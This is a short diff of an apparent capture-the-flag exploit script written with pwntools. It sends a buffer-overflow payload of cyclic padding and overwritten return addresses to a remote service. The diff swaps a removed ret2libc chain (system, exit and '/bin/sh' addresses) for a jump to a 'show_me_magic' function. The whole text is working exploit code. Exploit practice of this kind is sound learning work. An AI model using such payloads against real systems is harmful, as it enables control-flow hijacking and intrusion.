@@ -16,18 +16,7 @@ r = remote(ip, port)
 payload = "aaaabaaacaaadaaaeaaafaaa"
 # show_me_magic = 0x0000000000400627
 payload += p64(0x0000000000400627)
-# system = 0x400510
-# 0x7ffff7e3fed0
-payload += p64(0x7ffff7e3fed0)
-# exit = 0x7ffff7e35720
-payload += p64(0x7ffff7e35720)
-# /bin/sh = 
-# 0x400734
-# payload += p64(0x400734)
-# 0x600734
-# payload += p64(0x600734)
-# 0x7ffff7f7ccee
-payload += p64(0x7ffff7f7ccee)
+payload += p64(0x0000000000400627)
 
 r.sendline(payload)
 r.interactive()
